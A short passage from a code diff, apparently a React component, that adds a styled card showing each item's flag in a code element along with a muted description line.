+                          background: 'rgba(255,255,255,0.01)',
+                          border: '1px solid var(--border-light)',
+                          borderRadius: 'var(--radius-md)',
+                          display: 'flex',
+                          flexDirection: 'column',
+                          gap: '4px'
+                        }}
+                      >
+                        <code style={{ fontSize: '0.82rem', color: '#00e676', fontWeight: '700' }}>{item.flag}</code>
+                        <span style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>{item.desc}</span>
+                      </div>
+                    ))}
+                  </div>
+                </section>
+              )}
+
             </div>
 
           </div>
